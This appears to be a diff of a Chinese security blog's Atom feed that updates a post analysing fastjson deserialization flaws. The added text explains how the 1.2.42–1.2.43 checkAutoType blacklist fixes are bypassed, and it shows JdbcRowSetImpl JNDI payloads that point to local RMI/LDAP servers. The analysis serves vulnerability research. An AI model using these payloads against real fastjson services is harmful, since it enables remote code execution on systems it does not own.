@@ -4,7 +4,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom" xml:lang="zh-CN">
     <title type="text">Klear·blog</title>
     <subtitle type="html">Klear的生活记录&amp;&amp;工作记录。</subtitle>
-    <updated>2022-11-14T16:10:06&#43;08:00</updated>
+    <updated>2022-11-15T08:58:35&#43;08:00</updated>
     <id>https://klearcc.github.io/</id>
     <link rel="alternate" type="text/html" href="https://klearcc.github.io/" />
     <link rel="self" type="application/atom&#43;xml" href="https://klearcc.github.io/atom.xml" />
@@ -99,7 +99,7 @@
             <title type="text">fastjson&lt;=1.2.4 反序列化漏洞分析</title>
             <link rel="alternate" type="text/html" href="https://klearcc.github.io/post/javasec_fastjson1.2.24/" />
             <id>https://klearcc.github.io/post/javasec_fastjson1.2.24/</id>
-            <updated>2022-11-14T15:02:49&#43;08:00</updated>
+            <updated>2022-11-15T08:51:28&#43;08:00</updated>
             <published>2022-10-20T17:08:27&#43;08:00</published>
             <author>
                     <name>Klear</name>
@@ -197,6 +197,7 @@ terminal输出setName is running，说明整个过程中setName方法也被调�
 &lt;/ul&gt;
 &lt;p&gt;TemplatesImpl&lt;/p&gt;
 &lt;p&gt;jdbcRowSetImpl&lt;/p&gt;
+&lt;p&gt;有空闲时间&lt;/p&gt;
 &lt;h2 id=&#34;1225fastjson1241&#34;&gt;1.2.25&amp;lt;=Fastjson&amp;lt;=1.2.41&lt;/h2&gt;
 &lt;h4 id=&#34;修复&#34;&gt;修复&lt;/h4&gt;
 &lt;p&gt;引入了checkAutoType安全机制，默认关闭，不能反序列化任意类。打开checkAutoType后，基于内置黑名单过滤。
@@ -227,13 +228,30 @@ terminal输出setName is running，说明整个过程中setName方法也被调�
 &lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211141436419.png&#34; alt=&#34;image-20221114143656402&#34;&gt;
 &lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211141432153.png&#34; alt=&#34;image-20221114143249113&#34;&gt;&lt;/p&gt;
 &lt;h4 id=&#34;逻辑-1&#34;&gt;逻辑&lt;/h4&gt;
-&lt;p&gt;如果匹配到className的第一个字符是L和最后一个字符是分号的话，使用substring截取className的第二位到倒数第二位&lt;/p&gt;
+&lt;p&gt;checkAutoType中，如果匹配到className的第一个字符是L和最后一个字符是分号的话，使用substring截取className的第二位到倒数第二位&lt;/p&gt;
 &lt;h4 id=&#34;绕过-1&#34;&gt;绕过&lt;/h4&gt;
 &lt;p&gt;因为使用substring截取className的第二位到倒数第二位，双写 L和分号 即可绕过&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;{
     &amp;#34;@type&amp;#34;:&amp;#34;LLcom.sun.rowset.JdbcRowSetImpl;;&amp;#34;,
     &amp;#34;dataSourceName&amp;#34;:&amp;#34;rmi://127.0.0.1:1099/VulClass&amp;#34;,
     &amp;#34;autoCommit&amp;#34;:true
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;1225fastjson1243&#34;&gt;1.2.25&amp;lt;=Fastjson&amp;lt;=1.2.43&lt;/h2&gt;
+&lt;h4 id=&#34;修复-2&#34;&gt;修复&lt;/h4&gt;
+&lt;p&gt;1.2.43版本主要修复42版本中双写绕过的问题。在checkAutoType中添加了 如果className开头出现了两个LL将会抛出异常
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211141631595.png&#34; alt=&#34;image-20221114163128525&#34;&gt;&lt;/p&gt;
+&lt;h4 id=&#34;逻辑-2&#34;&gt;逻辑&lt;/h4&gt;
+&lt;p&gt;&lt;code&gt;L&lt;/code&gt;和&lt;code&gt;;&lt;/code&gt;被限制了，但是&lt;code&gt;[&lt;/code&gt;也参与了处理，讲道理&lt;code&gt;[&lt;/code&gt;也可以绕过黑名单用。由于1.2.42及以后判断用hash写的，不便于观察，因此使用1.2.25debug。
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211150836304.png&#34; alt=&#34;image-20221115083630236&#34;&gt;
+很明显@type值最前面添加&lt;code&gt;[&lt;/code&gt;即可，添加后提示第46个字符缺少&lt;code&gt;[&lt;/code&gt;
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211150847088.png&#34; alt=&#34;image-20221115084717042&#34;&gt;
+添加后提示第50个字符缺少&lt;code&gt;{&lt;/code&gt;
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211150848872.png&#34; alt=&#34;image-20221115084846839&#34;&gt;
+最终payload&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;{ 
+  &amp;#34;@type&amp;#34;: &amp;#34;[com.sun.rowset.JdbcRowSetImpl&amp;#34;[,
+  {&amp;#34;dataSourceName&amp;#34;: &amp;#34;ldap://127.0.0.1:1389/VulClass&amp;#34;,
+  &amp;#34;autoCommit&amp;#34;: true&amp;#34;
 }
 &lt;/code&gt;&lt;/pre&gt;</content>
             
